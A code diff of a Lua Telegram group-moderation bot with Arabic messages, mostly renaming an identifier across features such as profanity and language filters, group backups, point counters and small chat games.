 if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
-if DevALI:get(Jenral..'ALI:Lock:English'..msg.chat_id_) then
+if DevALI:get(JENRAL..'ALI:Lock:English'..msg.chat_id_) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 end
 end
 end
---     Source Jenral     --
-if DevALI:get(Jenral.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
 if text == "الغاء" then
 send(msg.chat_id_,msg.id_,"⌁︙تم الغاء حفظ الرابط")       
-DevALI:del(Jenral.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
 return false
 end
 if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
 local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
-DevALI:set(Jenral.."ALI:Groups:Links"..msg.chat_id_,Link)
+DevALI:set(JENRAL.."ALI:Groups:Links"..msg.chat_id_,Link)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ الرابط بنجاح', 1, 'md')
-DevALI:del(Jenral.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
+DevALI:del(JENRAL.."ALI:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
 return false 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 local msg = data.message_
 text = msg.content_.text_
 if text and Constructor(msg) then 
-if DevALI:get('JenralTEAM:'..Jenral.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+if DevALI:get('JENRALTEAM:'..JENRAL.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-DevALI:del('JenralTEAM:'..Jenral..'id:user'..msg.chat_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL..'id:user'..msg.chat_id_)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
-DevALI:del('JenralTEAM:'..Jenral.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevALI:del('JenralTEAM:'..Jenral.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
-local iduserr = DevALI:get('JenralTEAM:'..Jenral..'id:user'..msg.chat_id_)  
-DevALI:incrby(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
+local iduserr = DevALI:get('JENRALTEAM:'..JENRAL..'id:user'..msg.chat_id_)  
+DevALI:incrby(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
 Dev_ALI(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' رساله', 1, 'md')
-DevALI:del('JenralTEAM:'..Jenral..'id:user'..msg.chat_id_) 
+DevALI:del('JENRALTEAM:'..JENRAL..'id:user'..msg.chat_id_) 
 end
 end
 if text and Constructor(msg) then 
-if DevALI:get('JenralTEAM:'..Jenral.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
+if DevALI:get('JENRALTEAM:'..JENRAL.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
 if text and text:match("^الغاء$") then 
-DevALI:del('JenralTEAM:'..Jenral..'ids:user'..msg.chat_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL..'ids:user'..msg.chat_id_)  
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
-DevALI:del('JenralTEAM:'..Jenral.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 return false  end 
-DevALI:del('JenralTEAM:'..Jenral.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
 local numadded = string.match(text, "(%d+)") 
-local iduserr = DevALI:get('JenralTEAM:'..Jenral..'ids:user'..msg.chat_id_)  
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..iduserr,numadded)  
+local iduserr = DevALI:get('JENRALTEAM:'..JENRAL..'ids:user'..msg.chat_id_)  
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..iduserr,numadded)  
 Dev_ALI(msg.chat_id_, msg.id_,  1, "⌁︙تم اضافة "..numadded..' نقطه', 1, 'md')
-DevALI:del('JenralTEAM:'..Jenral..'ids:user'..msg.chat_id_)  
+DevALI:del('JENRALTEAM:'..JENRAL..'ids:user'..msg.chat_id_)  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
-if not DevALI:get(Jenral.."ALI:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
+if not DevALI:get(JENRAL.."ALI:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الفشار في المجموعه")  
 end end
 if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
-if DevALI:get(Jenral.."ALI:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
+if DevALI:get(JENRAL.."ALI:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالغه الفارسيه هنا")  
 end end
 if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
-if DevALI:get(Jenral.."ALI:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
+if DevALI:get(JENRAL.."ALI:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ChatKick(msg.chat_id_, msg.sender_user_id_)
 end end 
 if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
-if not DevALI:get(Jenral.."ALI:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
+if not DevALI:get(JENRAL.."ALI:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع الكفر في المجموعه") 
 end end
 if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
-if not DevALI:get(Jenral.."ALI:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
+if not DevALI:get(JENRAL.."ALI:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
 DeleteMessage(msg.chat_id_,{[0] = msg.id_})
 ReplyStatus(msg,msg.sender_user_id_,"WrongWay","⌁︙ممنوع التكلم بالطائفيه هنا") 
 end end
---     Source Jenral     --
+--     Source JENRAL     --
 if SecondSudo(msg) then
 if text == 'جلب نسخه الكروبات' or text == 'جلب نسخه احتياطيه' or text == 'جلب النسخه الاحتياطيه' then
-local List = DevALI:smembers(Jenral..'ALI:Groups') 
-local BotName = (DevALI:get(Jenral.."ALI:NameBot") or 'الجنرال')
-local GetJson = '{"BotId": '..Jenral..',"BotName": "'..BotName..'","GroupsList":{'  
+local List = DevALI:smembers(JENRAL..'ALI:Groups') 
+local BotName = (DevALI:get(JENRAL.."ALI:NameBot") or 'جنرال ')
+local GetJson = '{"BotId": '..JENRAL..',"BotName": "'..BotName..'","GroupsList":{'  
 for k,v in pairs(List) do 
-LinkGroups = DevALI:get(Jenral.."ALI:Groups:Links"..v)
-Welcomes = DevALI:get(Jenral..'ALI:Groups:Welcomes'..v) or ''
+LinkGroups = DevALI:get(JENRAL.."ALI:Groups:Links"..v)
+Welcomes = DevALI:get(JENRAL..'ALI:Groups:Welcomes'..v) or ''
 Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
-ALIConstructors = DevALI:smembers(Jenral..'ALI:ALIConstructor:'..v)
-Constructors = DevALI:smembers(Jenral..'ALI:BasicConstructor:'..v)
-BasicConstructors = DevALI:smembers(Jenral..'ALI:Constructor:'..v)
-Managers = DevALI:smembers(Jenral..'ALI:Managers:'..v)
-Admis = DevALI:smembers(Jenral..'ALI:Admins:'..v)
-Vips = DevALI:smembers(Jenral..'ALI:VipMem:'..v)
+ALIConstructors = DevALI:smembers(JENRAL..'ALI:ALIConstructor:'..v)
+Constructors = DevALI:smembers(JENRAL..'ALI:BasicConstructor:'..v)
+BasicConstructors = DevALI:smembers(JENRAL..'ALI:Constructor:'..v)
+Managers = DevALI:smembers(JENRAL..'ALI:Managers:'..v)
+Admis = DevALI:smembers(JENRAL..'ALI:Admins:'..v)
+Vips = DevALI:smembers(JENRAL..'ALI:VipMem:'..v)
 if k == 1 then
 GetJson = GetJson..'"'..v..'":{'
 else
@@ -3210,11 +3210,11 @@ end
 GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
 end
 GetJson = GetJson..'}}'
-local File = io.open('./'..Jenral..'.json', "w")
+local File = io.open('./'..JENRAL..'.json', "w")
 File:write(GetJson)
 File:close()
-sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Jenral..'.json', '⌁︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
-io.popen('rm -rf ./'..Jenral..'.json')
+sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..JENRAL..'.json', '⌁︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
+io.popen('rm -rf ./'..JENRAL..'.json')
 end
 if text and (text == 'رفع النسخه' or text == 'رفع النسخه الاحتياطيه' or text == 'رفع نسخه الاحتياطيه') and tonumber(msg.reply_to_message_id_) > 0 then   
 function by_reply(extra, result, success)   
@@ -3227,30 +3227,30 @@ end
 tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
 end
 end
---     Source Jenral     --
-if DevALI:get(Jenral.."SET:GAME"..msg.chat_id_) then  
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."SET:GAME"..msg.chat_id_) then  
 if text and text:match("^(%d+)$") then
 local NUM = text:match("^(%d+)$")
 if tonumber(NUM) > 6 then
 Dev_ALI( msg.chat_id_, msg.id_, 1,"⌁︙يوجد فقط ( 6 ) اختيارات\n⌁︙ارسل اختيارك مره اخرى", 1, "md")    
 return false  end 
-local GETNUM = DevALI:get(Jenral.."GAMES"..msg.chat_id_)
+local GETNUM = DevALI:get(JENRAL.."GAMES"..msg.chat_id_)
 if tonumber(NUM) == tonumber(GETNUM) then
-DevALI:del(Jenral.."SET:GAME"..msg.chat_id_)   
+DevALI:del(JENRAL.."SET:GAME"..msg.chat_id_)   
 Dev_ALI( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..NUM..'\n⌁︙*مبروك لقد ربحت وحصلت على 5 نقاط يمكنك استبدالها بالرسائل*', 1, "md") 
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_,5)  
 elseif tonumber(NUM) ~= tonumber(GETNUM) then
-DevALI:del(Jenral.."SET:GAME"..msg.chat_id_)   
+DevALI:del(JENRAL.."SET:GAME"..msg.chat_id_)   
 Dev_ALI( msg.chat_id_, msg.id_, 1,'⌁︙*المحيبس باليد رقم* ↫ '..GETNUM..'\n⌁︙*للاسف لقد خسرت حاول مره اخرى للعثور على المحيبس*', 1, "md")
 end
 end
 end
-if DevALI:get(Jenral..'DevALI4'..msg.sender_user_id_) then
+if DevALI:get(JENRAL..'DevALI4'..msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
 send(msg.chat_id_, msg.id_, "⌁︙تم الغاء الامر")
-DevALI:del(Jenral..'DevALI4'..msg.sender_user_id_)
+DevALI:del(JENRAL..'DevALI4'..msg.sender_user_id_)
 return false  end 
-DevALI:del(Jenral..'DevALI4'..msg.sender_user_id_)
+DevALI:del(JENRAL..'DevALI4'..msg.sender_user_id_)
 local username = string.match(text, "@[%a%d_]+") 
 tdcli_function({ID = "SearchPublicChat",username_ = username},function(arg,data) 
 if data and data.message_ and data.message_ == "USERNAME_NOT_OCCUPIED" then 
@@ -3265,7 +3265,7 @@ return false  end
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.is_supergroup_ == false then
 if data and data.type_ and data.type_.channel_ and data.type_.channel_.ID and data.type_.channel_.status_.ID == 'ChatMemberStatusEditor' then
 send(msg.chat_id_, msg.id_,'⌁︙البوت ادمن في القناة \n⌁︙تم تفعيل الاشتراك الاجباري \n⌁︙ايدي القناة ↫ '..data.id_..'\n⌁︙معرف القناة ↫ [@'..data.type_.channel_.username_..']')
-DevALI:set(Jenral..'ALI:ChId',data.id_)
+DevALI:set(JENRAL..'ALI:ChId',data.id_)
 else
 send(msg.chat_id_, msg.id_,'⌁︙عذرا البوت ليس ادمن في القناة')
 end
@@ -3273,34 +3273,34 @@ return false
 end
 end,nil)
 end
---     Source Jenral     --
-if DevALI:get(Jenral.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
+--     Source JENRAL     --
+if DevALI:get(JENRAL.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_) then
 if text and text:match("^الغاء$") then 
-DevALI:del(Jenral.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
 return false 
 end 
-DevALI:del(Jenral.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
+DevALI:del(JENRAL.."ALI:DevText"..msg.chat_id_..":" .. msg.sender_user_id_)
 local DevText = msg.content_.text_:match("(.*)")
-DevALI:set(Jenral.."DevText", DevText)
+DevALI:set(JENRAL.."DevText", DevText)
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ كليشة المطور", 1, "md")
 end
-if DevALI:get(Jenral..'ALI:NameBot'..msg.sender_user_id_) == 'msg' then
+if DevALI:get(JENRAL..'ALI:NameBot'..msg.sender_user_id_) == 'msg' then
 if text and text:match("^الغاء$") then 
-DevALI:del(Jenral..'ALI:NameBot'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:NameBot'..msg.sender_user_id_)
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم الغاء الامر', 1, 'md')
 return false 
 end 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حفظ اسم البوت ', 1, 'html')
-DevALI:del(Jenral..'ALI:NameBot'..msg.sender_user_id_)
-DevALI:set(Jenral..'ALI:NameBot', text)
+DevALI:del(JENRAL..'ALI:NameBot'..msg.sender_user_id_)
+DevALI:set(JENRAL..'ALI:NameBot', text)
 return false 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == "الرابط" then
-if not DevALI:get(Jenral.."ALI:Lock:GpLinks"..msg.chat_id_) then 
-if DevALI:get(Jenral.."ALI:Groups:Links"..msg.chat_id_) then
-Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevALI:get(Jenral.."ALI:Groups:Links"..msg.chat_id_), 1, "html")
+if not DevALI:get(JENRAL.."ALI:Lock:GpLinks"..msg.chat_id_) then 
+if DevALI:get(JENRAL.."ALI:Groups:Links"..msg.chat_id_) then
+Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙𝒈𝒓𝒐𝒖𝒑 𝒍𝒊𝒏𝒌 ↬ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"..DevALI:get(JENRAL.."ALI:Groups:Links"..msg.chat_id_), 1, "html")
 else 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙لايوجد رابط ارسل ↫ ضع رابط او ارسل ↫ انشاء رابط للانشاء', 1, 'md')
 end
@@ -3308,42 +3308,42 @@ else
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙جلب رابط المجموعه معطل', 1, 'md')
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == 'بوت' or text == 'بوتت' then 
-NameBot = (DevALI:get(Jenral..'ALI:NameBot') or 'الجنرال')
-local JenralTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
-Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM[math.random(#JenralTEAM)] , 1, 'html') 
+NameBot = (DevALI:get(JENRAL..'ALI:NameBot') or 'جنرال ')
+local JENRALTEAM = {"لتكول بوت اسمي "..NameBot.." 😒🔪","اسمي القميل "..NameBot.." 😚♥️","عندي اسم تره 😒💔","صيحولي "..NameBot.." كافي بوت 😒🔪","انت البوت لك 😒💔"} 
+Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM[math.random(#JENRALTEAM)] , 1, 'html') 
 return false
 end
 if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه' then
-NameBot = (DevALI:get(Jenral..'ALI:NameBot') or 'الجنرال') 
-local JenralTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
-Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM[math.random(#JenralTEAM)] , 1, 'html') 
+NameBot = (DevALI:get(JENRAL..'ALI:NameBot') or 'جنرال ') 
+local JENRALTEAM = {"اسمي القميل "..NameBot.." 😚♥️","هلاا يروحيي وياكك "..NameBot.." 😻♥️"} 
+Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM[math.random(#JENRALTEAM)] , 1, 'html') 
 return false
 end
-if text and text == (DevALI:get(Jenral..'ALI:NameBot') or 'الجنرال') then 
-NameBot = (DevALI:get(Jenral..'ALI:NameBot') or 'الجنرال')
-local JenralTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
-Dev_ALI(msg.chat_id_, msg.id_, 1, JenralTEAM[math.random(#JenralTEAM)] , 1, 'html') 
+if text and text == (DevALI:get(JENRAL..'ALI:NameBot') or 'جنرال ') then 
+NameBot = (DevALI:get(JENRAL..'ALI:NameBot') or 'جنرال ')
+local JENRALTEAM = {'😸♥️ هلا كلبي وياك '..NameBot..' تفضل','ترةه مصختهاا احجيي شرايد 😕😒💔','اطلقق واحدد يصيح '..NameBot..' 😻♥️','خبصتت امنةة شتريدد عااد 🤧😒💔'} 
+Dev_ALI(msg.chat_id_, msg.id_, 1, JENRALTEAM[math.random(#JENRALTEAM)] , 1, 'html') 
 return false 
 end
 if text =='نقاطي' and ChCheck(msg) then 
-if tonumber((DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
+if tonumber((DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
 Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙لم تربح اي نقطه\n⌁︙ارسل ↫ الالعاب للعب', 1, 'md')
 else 
-Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevALI:get(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
+Dev_ALI(msg.chat_id_, msg.id_, 1,'⌁︙عدد النقاط التي ربحتها ↫ '..(DevALI:get(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_)), 1, 'md')
 end
 end
-if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevALI:del(Jenral..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
-if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevALI:del(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
---     Source Jenral     --
+if text ==  'حذف رسائلي' and ChCheck(msg) or text ==  'مسح رسائلي' and ChCheck(msg) then DevALI:del(JENRAL..'ALI:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع رسائلك', 1, 'md') end
+if text ==  'حذف نقاطي' and ChCheck(msg) or text ==  'مسح نقاطي' and ChCheck(msg) then DevALI:del(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_) Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم حذف جميع نقاطك', 1, 'md') end
+--     Source JENRAL     --
 if text == 'سمايلات' and SourceCh(msg) or text == 'السمايلات' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'🍞','🍞')
 name = string.gsub(name,'🥖','🥖')
 name = string.gsub(name,'🥨','🥨')
@@ -3460,24 +3460,24 @@ name = string.gsub(name,'⏰','⏰')
 name = string.gsub(name,'📺','📺')
 name = string.gsub(name,'🎚','🎚')
 name = string.gsub(name,'☎️','☎️')
-JenralTEAM = '⌁︙اول واحد يدز هذا السمايل يربح ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اول واحد يدز هذا السمايل يربح ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
-JenralTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
-DevALI:incrby(Jenral..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
+if text == DevALI:get(JENRAL..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Games:Ids'..msg.chat_id_) then 
+JENRALTEAM = '⌁︙مبروك لقد ربحت في اللعبه \n⌁︙ارسل ↫ سمايلات للعب مره اخرى'
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
+DevALI:incrby(JENRAL..'ALI:GamesNumber'..msg.chat_id_..msg.sender_user_id_, 1)  
 end
-DevALI:set(Jenral..'ALI:Games:Ids'..msg.chat_id_,true)
+DevALI:set(JENRAL..'ALI:Games:Ids'..msg.chat_id_,true)
 end
 if text == 'ترتيب' and SourceCh(msg) or text == 'الترتيب' and SourceCh(msg) then
-if not DevALI:get(Jenral..'ALI:Lock:Games'..msg.chat_id_) then
+if not DevALI:get(JENRAL..'ALI:Lock:Games'..msg.chat_id_) then
 DevALI2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
 name = DevALI2[math.random(#DevALI2)]
-DevALI:set(Jenral..'ALI:GameNum'..msg.chat_id_,name)
-DevALI:del(Jenral..'ALI:Games:Ids'..msg.chat_id_)
+DevALI:set(JENRAL..'ALI:GameNum'..msg.chat_id_,name)
+DevALI:del(JENRAL..'ALI:Games:Ids'..msg.chat_id_)
 name = string.gsub(name,'سحور','س ر و ح')
 name = string.gsub(name,'سياره','ه ر س ي ا')
 name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
@@ -3518,22 +3518,22 @@ name = string.gsub(name,'حاسوب','س ا ح و ب')
 name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
 name = string.gsub(name,'ساحه','ح ا ه س')
 name = string.gsub(name,'جسر','ر ج س')
-JenralTEAM = '⌁︙اول واحد يرتبها يربح ↫ '..name
-Dev_ALI(msg.chat_id_, msg.id_, 1,JenralTEAM, 1, 'md')
+JENRALTEAM = '⌁︙اول واحد يرتبها يربح ↫ '..name
+Dev_ALI(msg.chat_id_, msg.id_, 1,JENRALTEAM, 1, 'md')
 return false
 end end
-if text == DevALI:get(Jenral..'ALI:GameNum'..msg.chat_id_) and not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then
-if not DevALI:get(Jenral..'ALI:Games:Ids'..msg.chat_id_) then 
